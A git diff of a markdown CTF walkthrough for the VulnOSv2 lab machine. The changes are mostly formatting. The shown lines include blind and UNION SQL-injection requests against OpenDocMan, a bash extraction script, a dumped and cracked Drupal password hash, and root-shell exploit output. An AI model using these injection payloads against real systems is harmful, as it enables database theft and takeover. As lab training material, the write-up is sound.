@@ -1,4 +1,4 @@
-#VulnOSv2
+# VulnOSv2
 
 **https://www.vulnhub.com/entry/vulnos-2,147/**
 
@@ -92,9 +92,9 @@ http://192.168.1.76/jabcd0cs/details.php?id=1%20and%20(select%20length(odm_user)
 **Char "_" is banned T.T'**
 
 kali@kali:~$ curl -s 'http://192.168.1.76/jabcd0cs/details.php?id=1%20and%201=1&state=2' -H 'Host: 192.168.1.76' -H 'Cookie: SpryMedia_DataTables_filetable_out.php=%7B%22iCreate%22%3A1521279979936%2C%22iStart%22%3A0%2C%22iEnd%22%3A10%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; SpryMedia_Da taTables_filetable_search.php=%7B%22iCreate%22%3A1521280061413%2C%22iStart%22%3A0%2C%22iEnd%22%3A1%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; has_js=1; PHPSESSID=s7p59g7pp1hhj1mo39da7ordl7' | grep -c "images/file_unlocked.png"
->1
-kali@kali:~$ curl -s 'http://192.168.1.76/jabcd0cs/details.php?id=1%20and%201=2&state=2' -H 'Host: 192.168.1.76' -H 'Cookie: SpryMedia_DataTables_filetable_out.php=%7B%22iCreate%22%3A1521279979936%2C%22iStart%22%3A0%2C%22iEnd%22%3A10%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; SpryMedia_DataTables_filetable_search.php=%7B%22iCreate%22%3A1521280061413%2C%22iStart%22%3A0%2C%22iEnd%22%3A1%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; has_js=1; PHPSESSID=s7p59g7pp1hhj1mo39da7ordl7' | grep -c "images/file_unlocked.png"
->0
+>1  
+kali@kali:~$ curl -s 'http://192.168.1.76/jabcd0cs/details.php?id=1%20and%201=2&state=2' -H 'Host: 192.168.1.76' -H 'Cookie: SpryMedia_DataTables_filetable_out.php=%7B%22iCreate%22%3A1521279979936%2C%22iStart%22%3A0%2C%22iEnd%22%3A10%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; SpryMedia_DataTables_filetable_search.php=%7B%22iCreate%22%3A1521280061413%2C%22iStart%22%3A0%2C%22iEnd%22%3A1%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; has_js=1; PHPSESSID=s7p59g7pp1hhj1mo39da7ordl7' | grep -c "images/file_unlocked.png"  
+>0  
 
 **We found our blind sqli! Let's script it!**
 
@@ -110,7 +110,7 @@ kali@kali:~$ cat injector.sh
 >curl -s "http://192.168.1.76/jabcd0cs/details.php?id=1%20and%20$_INJ_&state=2" -H 'Host: 192.168.1.76' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://192.168.1.76/jabcd0cs/out.php?' -H 'Cookie: SpryMedia_DataTables_filetable_out.php=%7B%22iCreate%22%3A1521654334977%2C%22iStart%22%3A0%2C%22iEnd%22%3A10%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; has_js=1; PHPSESSID=tlepojod9vsfojcqj7eao6t9j4' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' | grep -c "images/file_unlocked.png"  
 
 
-**Testing**
+**Testing**  
 kali@kali:~$ ./injector.sh "1=1"
 >1
 kali@kali:~$ ./injector.sh "1=2"
@@ -119,26 +119,26 @@ kali@kali:~$ ./injector.sh "(select length(1000000000000000000000000000000000000
 >1
 
 
-**Exploiting**
-kali@kali:~$ for i in {1..20}; do RES=$(./injector.sh "(select length(user()))=$i"); if [[ $RES == 1 ]]; then echo "[+]Length found: $i";fi; done
->[+]Length found: 14
+**Exploiting**  
+kali@kali:~$ for i in {1..20}; do RES=$(./injector.sh "(select length(user()))=$i"); if [[ $RES == 1 ]]; then echo "[+]Length found: $i";fi; done  
+>[+]Length found: 14  
 
-kali@kali:~$ for((h=1; h<=14; h++)); do for i in {32..126}; do RES=$(./injector.sh "(select hex(substr(user(),$h,1)))=hex($i)"); if [[ $RES == 1 ]]; then printf \\$(printf '%03o\n' "$i"); fi; done; done; echo ""
->root@localhost
+kali@kali:~$ for((h=1; h<=14; h++)); do for i in {32..126}; do RES=$(./injector.sh "(select hex(substr(user(),$h,1)))=hex($i)"); if [[ $RES == 1 ]]; then printf \\$(printf '%03o\n' "$i"); fi; done; done; echo ""  
+>root@localhost  
 
-kali@kali:~$ for i in {1..20}; do RES=$(./injector.sh "(select length(user()))=$i"); if [[ $RES == 1 ]]; then echo "[+]Length found: $i";fi; done
->8
+kali@kali:~$ for i in {1..20}; do RES=$(./injector.sh "(select length(user()))=$i"); if [[ $RES == 1 ]]; then echo "[+]Length found: $i";fi; done  
+>8  
 
-kali@kali:~$ for((h=1; h<=8; h++)); do for i in {32..126}; do RES=$(./injector.sh "(select hex(substr(database(),$h,1)))=hex($i)"); if [[ $RES == 1 ]]; then printf \\$(printf '%03o\n' "$i"); fi; done; done; echo ""
->jabcd0cs
+kali@kali:~$ for((h=1; h<=8; h++)); do for i in {32..126}; do RES=$(./injector.sh "(select hex(substr(database(),$h,1)))=hex($i)"); if [[ $RES == 1 ]]; then printf \\$(printf '%03o\n' "$i"); fi; done; done; echo ""  
+>jabcd0cs  
 
-**Couldn't go any further :(**
+**Couldn't go any further :(**  
 
-**Googling version**
+**Googling version**  
 
-OpenDocMan v1.2.7
+OpenDocMan v1.2.7  
 
-https://www.exploit-db.com/exploits/32075/
+https://www.exploit-db.com/exploits/32075/  
 
 http://192.168.1.76/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,schema_name,3,4,5,6,7,8,9%20from%20information_schema.schemata
 >information_schema  
@@ -154,11 +154,11 @@ http://192.168.1.76/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELEC
 http://192.168.1.76/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,pass,3,4,5,6,7,8,9%20from%20drupal7.users
 >$S$DPc41p2JwLXR6vgPCi.jC7WnRMkw3Zge3pVoJFnOn6gfMfsOr/Ug
 
-kali@kali:~$ sudo john pass 
-Using default input encoding: UTF-8
-Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])
-Press 'q' or Ctrl-C to abort, almost any other key for status
-webmin1980       
+kali@kali:~$ sudo john pass  
+>Using default input encoding: UTF-8  
+>Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])  
+>Press 'q' or Ctrl-C to abort, almost any other key for status  
+>webmin1980        
 
 ### REVERSE SHELL
 
@@ -217,9 +217,9 @@ webmin@VulnOSv2:~$ ./exploit
 >child threads done  
 >/etc/ld.so.preload created  
 >creating shared library  
-# id   
+># id    
 >uid=0(root) gid=0(root) groups=0(root),1001(webmin)  
-# /bin/bash	  
+># /bin/bash	  
 root@VulnOSv2:/home/webmin# 
 
 root@VulnOSv2:/home/webmin# cd /root
